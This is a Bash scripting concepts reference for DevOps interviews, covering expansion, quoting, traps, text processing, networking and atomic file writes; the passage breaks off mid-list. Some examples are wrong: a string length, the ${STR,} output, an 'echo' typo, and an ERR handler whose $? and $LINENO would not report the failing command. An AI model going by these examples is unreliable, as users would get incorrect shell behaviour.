# Shell Scripting — Concepts Reference

> Everything a senior DevOps engineer must know cold.
> Concept → why it matters → syntax → gotcha.

---

## 1. The Non-Negotiable Header

Every script you write in an interview must start with this. Not optional.

```bash
#!/usr/bin/env bash
set -euo pipefail
```

| Flag | What it does | Why it matters |
|---|---|---|
| `-e` | Exit immediately on any command failure | Prevents silent failures propagating |
| `-u` | Treat unset variables as errors | Catches typos like `$NAMEPSACE` silently expanding to empty string |
| `-o pipefail` | Pipe fails if ANY command in it fails | Without this, `false \| true` exits 0 |

**Gotcha:** `set -e` doesn't trigger inside `if`, `while`, `&&`, `\|\|` conditions — those are expected to fail. It only exits on unguarded failures.

```bash
# This WON'T exit even with -e (condition context)
if grep -q "pattern" file.txt; then echo "found"; fi

# This WILL exit with -e
grep -q "pattern" file.txt   # exits if pattern not found
```

---

## 2. Variables — Declaration, Scope, Expansion

### Basic rules
```bash
# Assignment — NO spaces around =
NAME="devops"           # correct
NAME = "devops"         # WRONG — treated as command named NAME

# Convention
GLOBAL_VAR="value"      # UPPER_CASE for env vars / constants
local_var="value"       # lower_case for local script variables

# local keyword — scope to function
my_func() {
    local result="hello"   # not visible outside function
    echo "$result"
}
```

### Parameter Expansion (critical for senior interviews)
```bash
VAR="hello"

${VAR}              # basic expansion
${VAR:-default}     # use default if VAR is unset OR empty
${VAR:=default}     # assign default if VAR is unset OR empty
${VAR:?error msg}   # exit with error if VAR is unset OR empty  ← use in scripts
${VAR:+other}       # use 'other' if VAR is set and non-empty

# String operations
${VAR#pattern}      # remove shortest prefix matching pattern
${VAR##pattern}     # remove longest prefix matching pattern
${VAR%pattern}      # remove shortest suffix matching pattern
${VAR%%pattern}     # remove longest suffix matching pattern
${VAR/old/new}      # replace first occurrence
${VAR//old/new}     # replace all occurrences

# Length
${#VAR}             # length of VAR

# Substring
${VAR:2}            # from index 2 to end
${VAR:2:4}          # from index 2, length 4
```

```bash
FILE="/var/log/nginx/access.log"
echo "${FILE##*/}"     # access.log   (basename)
echo "${FILE%/*}"      # /var/log/nginx  (dirname)
echo "${FILE%.log}"    # /var/log/nginx/access  (strip extension)

VERSION="v1.2.3"
cho "${VERSION#v}"    # 1.2.3   (strip prefix)
```

### Arrays
```bash
# Indexed array
fruits=("apple" "banana" "cherry")
echo "${fruits[0]}"         # apple
echo "${fruits[@]}"         # all elements
echo "${#fruits[@]}"        # count = 3
echo "${fruits[@]:1:2}"     # slice: banana cherry

# Iterate
for fruit in "${fruits[@]}"; do
    echo "$fruit"
done

# Associative array (bash 4+)
declare -A person
person["name"]="Alice"
person["role"]="DevOps"
echo "${person["name"]}"
for key in "${!person[@]}"; do
    echo "$key = ${person[$key]}"
done
```

---

## 3. Quoting Rules — The Most Common Source of Bugs

```bash
# Double quotes: expand variables and command substitution
echo "Hello $NAME"       # Hello devops
echo "Today: $(date)"    # Today: Mon Apr 7 ...

# Single quotes: literal, NO expansion
echo 'Hello $NAME'       # Hello $NAME
echo 'Today: $(date)'    # Today: $(date)

# Always quote variables to prevent word splitting and glob expansion
FILE="my file.txt"
cat $FILE      # WRONG — treated as two arguments: "my" and "file.txt"
cat "$FILE"    # correct

# Arrays must use [@] with quotes
for f in "${files[@]}"; do ...   # correct — preserves spaces in filenames
for f in ${files[@]};  do ...   # WRONG — splits on spaces
```

---

## 4. Conditionals — `[[ ]]` vs `[ ]`

**Always use `[[ ]]`** in bash scripts. `[ ]` is POSIX sh — less features, more surprises.

```bash
# String tests
[[ -z "$VAR" ]]       # true if empty
[[ -n "$VAR" ]]       # true if non-empty
[[ "$A" == "$B" ]]    # string equality
[[ "$A" != "$B" ]]    # string inequality
[[ "$A" =~ ^[0-9]+$ ]] # regex match (no quotes on pattern!)

# Numeric tests
[[ "$A" -eq "$B" ]]   # equal
[[ "$A" -ne "$B" ]]   # not equal
[[ "$A" -lt "$B" ]]   # less than
[[ "$A" -gt "$B" ]]   # greater than

# File tests
[[ -f "$FILE" ]]      # regular file exists
[[ -d "$DIR" ]]       # directory exists
[[ -r "$FILE" ]]      # readable
[[ -w "$FILE" ]]      # writable
[[ -x "$FILE" ]]      # executable
[[ -s "$FILE" ]]      # file exists and is non-empty
[[ -L "$FILE" ]]      # symbolic link

# Logical operators
[[ -f "$F" && -r "$F" ]]   # AND
[[ -z "$A" || -z "$B" ]]   # OR
[[ ! -f "$F" ]]            # NOT
```

---

## 5. Loops

```bash
# C-style for loop
for (( i=0; i<10; i++ )); do
    echo "$i"
done

# Iterate over range
for i in {1..10}; do echo "$i"; done
for i in {0..100..5}; do echo "$i"; done  # step 5

# Iterate over array
for item in "${array[@]}"; do ...

# Iterate over command output
while IFS= read -r line; do
    echo "Line: $line"
done < file.txt

# Process substitution (avoid subshell — variables persist)
while IFS= read -r line; do
    echo "$line"
done < <(find . -name "*.log")

# Until loop
until [[ "$STATUS" == "healthy" ]]; do
    STATUS=$(check_health)
    sleep 5
done
```

**Critical gotcha — subshell variable scope:**
```bash
# WRONG — count is modified in subshell, loses value after pipe
count=0
cat file.txt | while read line; do
    (( count++ ))
done
echo $count   # still 0!

# CORRECT — use process substitution (no subshell)
count=0
while IFS= read -r line; do
    (( count++ ))
done < <(cat file.txt)
echo $count   # correct
```

---

## 6. Functions

```bash
# Definition
check_pod_health() {
    local namespace="${1:?namespace required}"
    local pod="${2:?pod name required}"
    local timeout="${3:-30}"

    kubectl get pod "$pod" -n "$namespace" \
        --output jsonpath='{.status.phase}' 2>/dev/null
}

# Call
status=$(check_pod_health "default" "myapp-abc123" 60)

# Return values
# Bash functions return exit codes (0=success, 1-255=failure)
# To return data: use echo + command substitution

validate_input() {
    local input="$1"
    if [[ -z "$input" ]]; then
        echo "ERROR: input is empty" >&2
        return 1
    fi
    return 0
}

if ! validate_input "$USER_INPUT"; then
    exit 1
fi
```

---

## 7. Error Handling — Production-Grade Patterns

```bash
#!/usr/bin/env bash
set -euo pipefail

# Trap for cleanup on exit
TMPFILE=""

cleanup() {
    local exit_code=$?
    [[ -n "$TMPFILE" ]] && rm -f "$TMPFILE"
    if [[ $exit_code -ne 0 ]]; then
        echo "ERROR: Script failed at line $LINENO with exit code $exit_code" >&2
    fi
    exit $exit_code
}
trap cleanup EXIT

# Trap specific signals
trap 'echo "Interrupted"; exit 130' INT TERM

# Usage/argument validation pattern
usage() {
    cat >&2 <<EOF
Usage: $(basename "$0") [OPTIONS] <required_arg>

Options:
  -n NAMESPACE   Kubernetes namespace (default: default)
  -t TIMEOUT     Timeout in seconds (default: 60)
  -h             Show this help

Example:
  $(basename "$0") -n production myapp
EOF
    exit 1
}

# Parse args with getopts
NAMESPACE="default"
TIMEOUT=60
while getopts "n:t:h" opt; do
    case $opt in
        n) NAMESPACE="$OPTARG" ;;
        t) TIMEOUT="$OPTARG" ;;
        h) usage ;;
        ?) usage ;;
    esac
done
shift $(( OPTIND - 1 ))

[[ $# -lt 1 ]] && usage
REQUIRED_ARG="$1"
```

---

## 8. Text Processing — awk, sed, grep

### grep
```bash
grep "pattern" file.txt             # basic search
grep -i "pattern" file.txt          # case-insensitive
grep -v "pattern" file.txt          # invert match (exclude)
grep -c "pattern" file.txt          # count matching lines
grep -n "pattern" file.txt          # show line numbers
grep -r "pattern" /dir/             # recursive
grep -l "pattern" /dir/*.log        # only filenames
grep -E "error|warn|fatal" file     # extended regex (ERE)
grep -o "Error: [^$]*" file         # print only matching part
grep -A 3 "ERROR" file              # 3 lines AFTER match
grep -B 2 "ERROR" file              # 2 lines BEFORE match
grep -P '\d{4}-\d{2}-\d{2}' file   # Perl regex
```

### sed
```bash
sed 's/old/new/' file           # replace first occurrence per line
sed 's/old/new/g' file          # replace all occurrences per line
sed 's/old/new/gi' file         # case-insensitive replace all
sed -i 's/old/new/g' file       # in-place edit
sed -i.bak 's/old/new/g' file   # in-place with backup
sed -n '5,10p' file             # print lines 5-10
sed '1,3d' file                 # delete lines 1-3
sed '/^#/d' file                # delete comment lines
sed '/^$/d' file                # delete empty lines
sed -n '/START/,/END/p' file    # print between patterns
sed 's/^/  /' file              # indent every line
sed 's/[[:space:]]*$//' file    # strip trailing whitespace
```

### awk
```bash
# awk 'pattern { action }' file
# Built-in variables: NR=line number, NF=field count, FS=field separator

awk '{print $1}' file           # print first field
awk '{print $NF}' file          # print last field
awk -F: '{print $1}' /etc/passwd  # colon-separated
awk 'NR==5' file                # print line 5
awk 'NR>=3 && NR<=7' file       # print lines 3-7
awk '/ERROR/' file              # lines matching pattern
awk '!/DEBUG/' file             # lines NOT matching
awk '{sum += $3} END {print sum}' file   # sum column 3
awk '{count[$1]++} END {for (k in count) print k, count[k]}' file  # frequency count

# Multi-condition
awk '$3 > 100 {print $1, $3}' file

# printf formatting
awk '{printf "%-20s %5d\n", $1, $2}' file

# BEGIN/END blocks
awk 'BEGIN {print "Header"} {print} END {print "Footer"}' file

# Field separator output
awk -F: 'BEGIN{OFS=","} {print $1,$3}' /etc/passwd
```

---

## 9. Process Management and Job Control

```bash
# Background execution
long_command &
PID=$!              # capture PID of last backgrounded job
echo "Started PID: $PID"

# Wait for specific PID
wait $PID
echo "Exit code: $?"

# Wait for all background jobs
wait
echo "All done"

# Job control
jobs                # list background jobs
fg %1               # bring job 1 to foreground
bg %1               # send job 1 to background
kill %1             # kill job 1

# Parallel execution with tracking
pids=()
for host in "${hosts[@]}"; do
    check_host "$host" &
    pids+=($!)
done

# Wait and collect exit codes
failed=0
for pid in "${pids[@]}"; do
    if ! wait "$pid"; then
        (( failed++ )) || true
    fi
done
[[ $failed -gt 0 ]] && echo "WARN: $failed checks failed"
```

---

## 10. Signals and Traps

### What is a Signal?

A **signal** is a notification sent by the OS (or a user) to a running process.
Think of it like a tap on the shoulder — the process stops what it's doing and reacts.

```
You press Ctrl+C
      ↓
OS sends SIGINT to your script
      ↓
Script receives it — what now?
  → Default: script dies immediately
  → With trap: script runs YOUR cleanup function first
```

### What is a Trap?

`trap` lets you **intercept** a signal and run your own code before the script exits.
Without it, your script can die mid-run and leave behind:
- temp files not deleted
- lock files not released
- child processes still running
- half-written output files

---

### The Signal List

| Signal | Number | Sent when | Can trap? |
|---|---|---|---|
| `SIGINT` | 2 | User pressed **Ctrl+C** | Yes |
| `SIGTERM` | 15 | `kill <pid>` — graceful shutdown request | Yes |
| `SIGKILL` | 9 | `kill -9 <pid>` — force kill | **No — cannot trap** |
| `SIGHUP` | 1 | Terminal closed / config reload | Yes |
| `EXIT` | — | Script exits for **any reason** | Yes (pseudo-signal) |

**`EXIT` is the most important one.** It fires on:
- Normal exit
- `set -e` error exit
- Ctrl+C
- `kill` signal

One `trap ... EXIT` covers all cases.

---

### Syntax

```bash
trap 'command or function' SIGNAL [SIGNAL2 ...]

trap cleanup EXIT           # run cleanup() on any exit
trap cleanup INT TERM       # run on Ctrl+C or kill
trap 'rm -f $TMPFILE' EXIT  # inline command
trap '' INT                 # IGNORE the signal (empty string)
trap - INT                  # RESET to default behaviour
```

---

### Example 1 — Temp File Cleanup (Most Common)

```bash
#!/usr/bin/env bash
set -euo pipefail

TMPFILE=$(mktemp)

cleanup() {
    echo "Cleaning up..." >&2
    rm -f "$TMPFILE"
}
trap cleanup EXIT   # fires no matter HOW the script exits

# Do work
echo "data" > "$TMPFILE"
process "$TMPFILE"

# Even if process fails, cleanup() still runs
```

Without the trap — if the script errors halfway, `$TMPFILE` stays on disk forever.

---

### Example 2 — Graceful Shutdown of a Loop

```bash
#!/usr/bin/env bash
set -euo pipefail

RUNNING=true

cleanup() {
    echo "Signal received — stopping gracefully..."
    RUNNING=false
    kill 0    # send signal to ALL processes in this process group (children too)
}

trap cleanup INT TERM EXIT

while $RUNNING; do
    echo "Working at $(date)"
    sleep 5
done

echo "Exited cleanly."
```

**What happens when you press Ctrl+C:**
1. OS sends `SIGINT` to the script
2. `trap` intercepts it — runs `cleanup()`
3. `RUNNING=false` — loop exits naturally on next iteration
4. Script exits with "Exited cleanly."

Without the trap — Ctrl+C kills the script mid-sleep, child processes may be orphaned.

---

### Example 3 — Know Which Line Failed

```bash
#!/usr/bin/env bash
set -euo pipefail

error_handler() {
    echo "ERROR: Script failed at line $LINENO" >&2
    echo "Last command exit code: $?" >&2
}
trap error_handler ERR    # ERR fires when any command exits non-zero

some_command_that_fails
```

`ERR` pseudo-signal — fires whenever a command exits with non-zero (with `set -e`).
`$LINENO` — bash built-in: current line number.
`$?` — exit code of the last command.

---

### Example 4 — Multiple Traps Together

```bash
#!/usr/bin/env bash
set -euo pipefail

TMPFILE=""
LOCKFILE="/var/lock/myscript.lock"

cleanup() {
    local exit_code=$?
    [[ -f "$TMPFILE" ]]   && rm -f "$TMPFILE"
    [[ -f "$LOCKFILE" ]]  && rm -f "$LOCKFILE"
    [[ $exit_code -ne 0 ]] && echo "Failed with exit code: $exit_code" >&2
    exit $exit_code
}

trap cleanup EXIT          # handles everything
trap 'echo "Interrupted"' INT   # extra message on Ctrl+C

TMPFILE=$(mktemp)
touch "$LOCKFILE"

# ... do work ...
```

---

### `kill 0` — What Does It Mean?

```bash
kill 0       # sends signal to ALL processes in the current process group
kill 0       # equivalent to: kill -TERM -$$
```

When your script starts child processes, `kill 0` stops all of them at once — you don't need to track individual PIDs.

```bash
cleanup() {
    kill 0 2>/dev/null   # 2>/dev/null: suppress "no such process" errors
    wait                 # wait for all children to actually stop
}
```

---

### Common Trap Patterns — Quick Reference

```bash
# 1. Always clean up temp file
trap 'rm -f "$TMPFILE"' EXIT

# 2. Clean up + print error info
trap 'echo "Failed at line $LINENO" >&2' ERR

# 3. Ignore Ctrl+C (non-interruptible script)
trap '' INT

# 4. Reset to default (remove your trap)
trap - EXIT

# 5. Show what traps are set
trap -p

# 6. Graceful loop shutdown
trap 'RUNNING=false' INT TERM
```

---

```bash
# Full production pattern
RUNNING=true

cleanup() {
    echo "Caught signal — cleaning up..."
    RUNNING=false
    kill 0 2>/dev/null
    wait
}

trap cleanup INT TERM EXIT

while $RUNNING; do
    do_work
    sleep 5
done
```

---

## 11. String Manipulation

Bash has no string library like Python. Everything is done with **parameter expansion**, **IFS tricks**, or external tools. Knowing these cold is a senior-level signal.

---

### Case Conversion (bash 4+)

```bash
STR="Hello, World 2026"

echo "${STR,,}"     # hello, world 2026     ← all lowercase
echo "${STR^^}"     # HELLO, WORLD 2026     ← all uppercase
echo "${STR^}"      # Hello, World 2026     ← capitalize FIRST char only
echo "${STR,}"      # hELLO, WORLD 2026     ← lowercase FIRST char only
```

**How to remember:**
- `,` looks like it droops → lowercase
- `^` points up → uppercase
- Single = first char only. Double = all chars.

```bash
# Real use: normalize user input regardless of how they typed it
read -r env
env="${env,,}"    # force lowercase before comparing
if [[ "$env" == "production" ]]; then ...
```

---

### String Length
```bash
STR="Hello, World 2026"
echo "${#STR}"    # 18

# Length of array
arr=("a" "b" "c")
echo "${#arr[@]}"  # 3

# Length of specific element
echo "${#arr[0]}"  # 1
```

`#` inside `${}` means "give me the length of", not "remove prefix".

---

### Substring Extraction

```bash
STR="Hello, World 2026"

echo "${STR:7}"       # World 2026    ← from index 7 to end
echo "${STR:7:5}"     # World         ← from index 7, take 5 chars
echo "${STR:0:5}"     # Hello         ← first 5 chars
echo "${STR: -4}"     # 2026          ← last 4 chars (space before - is required!)
echo "${STR: -4:2}"   # 20            ← 2 chars starting 4 from end
```

**Gotcha — negative index needs a space:**
```bash
echo "${STR:-4}"    # WRONG — this is "use default -4 if STR is empty"
echo "${STR: -4}"   # CORRECT — space before - makes it negative index
```

---

### Remove Prefix / Suffix (Pattern Expansion)

```bash
FILE="/var/log/nginx/access.log"

# Remove prefix
echo "${FILE#/var/}"       # log/nginx/access.log   (shortest prefix match)
echo "${FILE##*/}"         # access.log              (longest — basename trick)

# Remove suffix
echo "${FILE%.log}"        # /var/log/nginx/access   (strip extension)
echo "${FILE%/*}"          # /var/log/nginx           (longest — dirname trick)
echo "${FILE%%/*}"         # empty                    (removes everything after first /)

VERSION="v1.2.3"
echo "${VERSION#v}"        # 1.2.3   (strip the v prefix)
```

**Memory trick:**
- `#` / `##` → remove from **front** (think: # is at the start of bash comments)
- `%` / `%%` → remove from **back**
- Single = shortest match, Double = longest match

---

### Replace — Find and Replace in String

```bash
STR="the cat sat on the mat"

echo "${STR/the/a}"      # a cat sat on the mat     ← replaces FIRST only
echo "${STR//the/a}"     # a cat sat on a mat        ← replaces ALL
echo "${STR/#the/a}"     # a cat sat on the mat      ← replace only if at START
echo "${STR/%mat/rug}"   # the cat sat on the rug    ← replace only if at END

# Replace with nothing = delete
echo "${STR// /}"        # thecatsatonthemat   ← remove all spaces
```

---

### Trim Whitespace

Bash has no `trim()` built-in. Two approaches:

```bash
# Approach 1 — parameter expansion (no subprocess, fast)
trim() {
    local var="$1"
    var="${var#"${var%%[![:space:]]*}"}"   # trim leading whitespace
    var="${var%"${var##*[![:space:]]}"}"   # trim trailing whitespace
    echo "$var"
}

trim "   hello world   "   # "hello world"
```

Breaking down the inner logic:
```
${var%%[![:space:]]*}
  %%              → remove longest suffix
  [![:space:]]*   → pattern: a non-space char followed by anything
  Result          → only the leading whitespace

${var#"<leading whitespace>"}
  #               → remove that leading whitespace prefix
```

```bash
# Approach 2 — xargs trick (simple, spawns subprocess)
echo "   hello world   " | xargs    # hello world

# Approach 3 — sed (most readable)
echo "   hello world   " | sed 's/^[[:space:]]*//; s/[[:space:]]*$//'
```

---

### Split String into Array

```bash
# Using IFS + read
IFS=',' read -ra parts <<< "a,b,c,d"
echo "${parts[0]}"     # a
echo "${parts[1]}"     # b
echo "${parts[@]}"     # a b c d
echo "${#parts[@]}"    # 4

# Split PATH by colon
IFS=':' read -ra path_parts <<< "$PATH"
for p in "${path_parts[@]}"; do
    echo "$p"
done

# Split by multiple chars — use regex
IFS=$':\n\t' read -ra parts <<< "a:b:c"
```

**Why `-ra`?**
- `-r` = raw (don't interpret backslashes)
- `-a` = store into array

**Why `<<<`?**
- here string — feeds the string as stdin to `read`
- avoids a subshell (unlike `echo | read`)

---

### Join Array into String

```bash
arr=("one" "two" "three")

# Method 1 — IFS trick
IFS=','; joined="${arr[*]}"; IFS=$' \t\n'
echo "$joined"    # one,two,three

# Method 2 — printf (cleaner, no IFS mutation)
joined=$(printf '%s,' "${arr[@]}")
joined="${joined%,}"   # strip trailing comma
echo "$joined"         # one,two,three

# Method 3 — loop
joined=""
for item in "${arr[@]}"; do
    joined="${joined:+$joined,}${item}"   # :+ adds comma only if joined is non-empty
done
echo "$joined"    # one,two,three
```

**Explain `${joined:+$joined,}`:**
- `:+` means "if `joined` is non-empty, use this value"
- First iteration: `joined` is empty → `:+` gives nothing → just `$item`
- Later iterations: `joined` is set → gives `$joined,` → appends comma

---

### Check if String Contains / Starts With / Ends With

```bash
STR="Hello, World 2026"

# Contains
if [[ "$STR" == *"World"* ]]; then
    echo "contains World"
fi

# Starts with
if [[ "$STR" == Hello* ]]; then
    echo "starts with Hello"
fi

# Ends with
if [[ "$STR" == *2026 ]]; then
    echo "ends with 2026"
fi

# Regex match (most powerful)
if [[ "$STR" =~ [0-9]{4}$ ]]; then
    echo "ends with 4 digits"
    echo "matched: ${BASH_REMATCH[0]}"   # 2026
fi
```

**`*` in `[[ ]]` is glob, not regex.** For regex, use `=~`.

`BASH_REMATCH[0]` — the full regex match.
`BASH_REMATCH[1]` — first capture group `(...)`.

---

### Check Empty / Non-empty

```bash
STR=""

[[ -z "$STR" ]]   # true if EMPTY (zero length)
[[ -n "$STR" ]]   # true if NON-EMPTY (non-zero length)

# With default
name="${NAME:-anonymous}"   # use "anonymous" if NAME is empty/unset
```

---

### Real DevOps Examples

```bash
# Extract image tag from full image reference
IMAGE="myregistry.azurecr.io/myapp:v1.2.3"
TAG="${IMAGE##*:}"           # v1.2.3
REGISTRY="${IMAGE%%/*}"      # myregistry.azurecr.io
APP="${IMAGE#*/}"; APP="${APP%:*}"  # myapp

# Strip environment prefix from variable names
VAR_NAME="PROD_DATABASE_URL"
echo "${VAR_NAME#PROD_}"     # DATABASE_URL

# Convert deployment name to ConfigMap name
DEPLOY="my-app-backend"
CONFIG="${DEPLOY/app/config}"  # my-config-backend

# Validate version format
VERSION="v1.2.3"
if [[ ! "$VERSION" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "ERROR: Invalid version format: $VERSION" >&2
    exit 1
fi
```

---

## 12. File and Directory Operations

```bash
# Read file line by line (safest pattern)
while IFS= read -r line || [[ -n "$line" ]]; do
    echo "$line"
done < "file.txt"
# Note: || [[ -n "$line" ]] handles files without trailing newline

# Check and create directory
mkdir -p "/path/to/dir"   # -p: no error if exists, creates parents

# Find files
find /var/log -name "*.log" -mtime +7        # older than 7 days
find /app -name "*.py" -not -path "*/venv/*" # exclude directory
find . -type f -size +100M                    # files > 100MB
find . -perm /u+x                             # executable by owner
find . -name "*.log" -exec gzip {} \;         # compress each found file
find . -name "*.log" -print0 | xargs -0 gzip # faster for many files

# Temporary files
TMPFILE=$(mktemp)               # /tmp/tmp.XXXXXX
TMPDIR=$(mktemp -d)             # temporary directory
trap "rm -rf $TMPFILE $TMPDIR" EXIT   # always clean up

# File checksums
md5sum file.txt
sha256sum file.txt
# Verify
sha256sum -c checksums.txt

# Atomic file write (prevents partial reads)
write_atomic() {
    local target="$1"
    local tmpfile
    tmpfile=$(mktemp "${target}.tmp.XXXXXX")
    # write to temp first
    cat > "$tmpfile"
    # atomic rename
    mv "$tmpfile" "$target"
}
echo "new content" | write_atomic "/etc/app/config.yaml"
```

---

## 13. Here Documents and Here Strings

```bash
# Here document — multi-line input
cat > /tmp/script.py << 'EOF'
import sys
print(f"Hello from Python {sys.version}")
EOF
# Single-quoted EOF: NO variable expansion inside
# Unquoted EOF: variables ARE expanded

# Indented here doc (bash 4+)
cat > /tmp/config.yaml <<- EOF
	database:
	  host: ${DB_HOST}
	  port: ${DB_PORT}
EOF
# Tab indentation stripped from each line

# Here string — single-line input
grep "pattern" <<< "$VARIABLE"
base64 --decode <<< "SGVsbG8="
```

---

## 14. Networking in Scripts

```bash
# HTTP requests
curl -sf --max-time 10 "https://api.example.com/health"
# -s: silent, -f: fail on HTTP errors (4xx/5xx return exit code 22)

# With auth and JSON body
curl -sf \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer ${TOKEN}" \
    -d '{"key": "value"}' \
    "https://api.example.com/endpoint"

# Download with retry
curl -fSL --retry 3 --retry-delay 2 \
    -o /tmp/file.tar.gz \
    "https://example.com/file.tar.gz"

# Check port is open
nc -z -w5 hostname 443 && echo "open" || echo "closed"

# Wait for port
wait_for_port() {
    local host="$1" port="$2" timeout="${3:-60}"
    local deadline=$(( $(date +%s) + timeout ))
    until nc -z -w1 "$host" "$port" 2>/dev/null; do
        [[ $(date +%s) -gt $deadline ]] && { echo "Timeout waiting for $host:$port" >&2; return 1; }
        sleep 2
    done
}

# DNS lookup
dig +short api.example.com
nslookup api.example.com
host api.example.com
```

---

## 15. Locking — Prevent Concurrent Execution

```bash
#!/usr/bin/env bash
set -euo pipefail

LOCK_FILE="/var/lock/$(basename "$0").lock"

# flock — file-based locking
exec 9>"$LOCK_FILE"
if ! flock -n 9; then
    echo "ERROR: Another instance is already running" >&2
    exit 1
fi
trap "flock -u 9; rm -f $LOCK_FILE" EXIT

# Now running exclusively
echo "Running with lock..."
```

---

## 16. Arithmetic

```bash
# Integer arithmetic
(( result = 5 + 3 ))
(( count++ ))
(( count += 10 ))
echo $(( 100 / 7 ))   # integer division = 14

# Check arithmetic condition
(( count > 10 )) && echo "over 10"
if (( count >= threshold )); then ...

# Floating point — bash doesn't support it, use bc or awk
echo "scale=2; 100/7" | bc          # 14.28
awk 'BEGIN {printf "%.2f\n", 100/7}' # 14.29

# Increment safely with set -e
(( count++ )) || true   # (( 0++ )) returns 1 (falsy) — needs || true
# Better:
count=$(( count + 1 ))
```

---

## 17. Input/Output Redirection

```bash
# Standard streams
#  0 = stdin
#  1 = stdout
#  2 = stderr

command > file.txt       # stdout to file (overwrite)
command >> file.txt      # stdout to file (append)
command 2> error.txt     # stderr to file
command 2>&1             # redirect stderr to stdout
command > out.txt 2>&1   # both to file (order matters!)
command &> file.txt      # shorthand: both to file

# Discard output
command > /dev/null 2>&1
command &> /dev/null

# Read from file
command < input.txt

# Tee — write to file AND stdout
command | tee output.txt
command | tee -a output.txt   # append

# Process substitution
diff <(command1) <(command2)  # compare outputs without temp files
```

---

## 18. xargs — Build Commands from Input

```bash
# Basic
find . -name "*.log" | xargs rm

# Handle filenames with spaces
find . -name "*.log" -print0 | xargs -0 rm

# Run N processes in parallel
cat hosts.txt | xargs -P 10 -I {} ssh {} "uptime"
# -P 10: 10 parallel processes
# -I {}: replace {} with input

# With a shell function
process() { echo "Processing: $1"; }
export -f process
cat items.txt | xargs -P 5 -I {} bash -c 'process "$@"' _ {}
```

---

## 19. jq — JSON Processing in Shell

```bash
# Parse JSON
echo '{"name":"alice","age":30}' | jq '.name'          # "alice"
echo '{"name":"alice","age":30}' | jq -r '.name'        # alice (raw, no quotes)

# Array
echo '[1,2,3]' | jq '.[]'                               # each element
echo '[1,2,3]' | jq '.[1]'                              # second element
echo '[1,2,3]' | jq 'length'                            # 3

# Filter objects in array
echo '[{"name":"a","status":"ok"},{"name":"b","status":"fail"}]' | \
    jq '.[] | select(.status == "fail") | .name'

# Construct new JSON
kubectl get pods -o json | \
    jq -r '.items[] | select(.status.phase != "Running") | 
    [.metadata.namespace, .metadata.name, .status.phase] | 
    @tsv'

# With default values
echo '{}' | jq '.name // "unknown"'

# Multiple outputs
kubectl get nodes -o json | \
    jq -r '.items[] | .metadata.name + "\t" + .status.conditions[-1].type'
```

---

## 20. Common Gotchas — Senior-Level Awareness

```bash
# 1. Glob expansion in conditionals
files=(*.txt)
if [[ "${#files[@]}" -gt 0 && -f "${files[0]}" ]]; then ...
# If no .txt files, files=("*.txt") — the literal glob string!
# Always check -f before using glob results

# 2. Unintended field splitting with IFS
OLD_IFS="$IFS"
IFS=','
read -ra parts <<< "$csv_line"
IFS="$OLD_IFS"   # always restore

# 3. set -e and subshells
set -e
result=$(false)   # THIS DOES EXIT — command substitution propagates
(false)           # THIS DOES EXIT — subshell exit propagates
{ false; }        # THIS DOES EXIT — group commands propagate

# 4. Integer check
is_integer() {
    [[ "$1" =~ ^-?[0-9]+$ ]]
}

# 5. Comparing numbers as strings
[[ "10" > "9" ]]    # WRONG — string comparison: "1" < "9"
[[ 10 -gt 9 ]]      # CORRECT — numeric comparison

# 6. || and && with set -e
# These suppress -e within the condition
[[ -f file ]] || echo "missing"   # -e won't trigger even if [[ fails

# 7. Read from command that may produce no output
output=$(command 2>/dev/null) || true   # don't fail if empty

# 8. Nested quotes in commands
# Use arrays instead of strings for commands with spaces
cmd=(kubectl get pods -n "$NAMESPACE" -l "app=$APP")
"${cmd[@]}"
```

---

## 21. Atomicity in Shell — Deep Dive

Shell has **no built-in atomic operations** like databases or programming languages.
When we say "atomic" in shell, we mean: **an operation that either fully completes or doesn't happen at all — no intermediate/corrupt state is visible to other processes.**

The kernel provides a small set of **single-syscall operations** that are indivisible. Shell atomicity = leveraging those syscalls.

---

### The Two Atomic Filesystem Primitives

#### 1. `mv` / `rename(2)` — The Foundation

```bash
# rename(2) syscall is atomic on the SAME filesystem
mv /tmp/config.tmp /etc/app/config.yaml
```

- `mv` within the same filesystem = single `rename(2)` syscall
- The inode pointer switches instantly — no moment where the file is half-written or missing
- Any process reading the target path sees either the **old content** or the **new content**, never partial
- **Cross-filesystem `mv` is NOT atomic** — it becomes copy + delete (two syscalls = race window)

This is why the `write_atomic` pattern in Section 12 works:

```bash
write_atomic() {
    local target="$1"
    local tmpfile
    tmpfile=$(mktemp "${target}.tmp.XXXXXX")  # same dir = same filesystem guaranteed
    cat > "$tmpfile"                           # write fully to temp (invisible to readers)
    mv "$tmpfile" "$target"                    # atomic swap — single rename(2)
}
```

Why `mktemp "${target}.tmp.XXXXXX"` and not `mktemp` (which defaults to `/tmp`)?
- Creates the temp in the **same directory** as the target → guarantees same filesystem
- If target is `/etc/app/config.yaml` and `/tmp` is a different mount, `mv` falls back to copy+delete = not atomic

What happens during failures:
- Script crashes during `cat > "$tmpfile"` → target file is **untouched**, orphan temp file left behind
- Power fails during `mv` → rename either happened or didn't (no partial state)
- Disk full during `cat >` → temp file is partial, target still has old content

#### 2. `O_APPEND` — Atomic Appends (With a Size Limit)

```bash
# Writes ≤ PIPE_BUF (4096 bytes on Linux) to O_APPEND files are atomic
echo "log line" >> /var/log/app.log
```

- `>>` opens with `O_APPEND` flag — the kernel atomically seeks to end and writes
- Multiple processes can `>>` to the same file **without interleaving** — if each write ≤ `PIPE_BUF`
- `PIPE_BUF` = 4096 bytes on Linux, 512 bytes POSIX minimum
- Beyond `PIPE_BUF`, writes can interleave — log lines get mangled across processes

```bash
# Safe — each echo is one write() syscall, well under 4096 bytes
for host in "${hosts[@]}"; do
    check_host "$host" >> results.log &
done
wait

# UNSAFE — if output exceeds 4096 bytes, lines interleave
for host in "${hosts[@]}"; do
    run_big_report "$host" >> results.log &   # reports > 4KB = mangled output
done
```

---

### What Is NOT Atomic — Common Traps

#### TOCTOU (Time-Of-Check to Time-Of-Use) Races

```bash
# NOT atomic — read + write is TWO operations
count=$(cat counter.txt)
echo $((count + 1)) > counter.txt
# Another process can read counter.txt between these two lines
# Both processes read "5", both write "6" — lost update

# NOT atomic — check + act is TWO operations
if [ ! -f /tmp/lockfile ]; then
    touch /tmp/lockfile    # another process can create it between test and touch
fi
```

**TOCTOU** = you check a condition, then act on it, but the condition changed between check and act.

#### Redirect Truncation Race

```bash
# NOT atomic — > truncates THEN writes
echo "data" > file.txt
```

What actually happens:
1. Kernel opens `file.txt` with `O_TRUNC` → file is now **empty** (0 bytes)
